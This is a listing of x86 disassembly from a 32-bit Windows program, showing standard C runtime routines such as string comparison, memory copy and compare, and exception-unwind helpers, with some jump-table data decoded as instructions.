  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
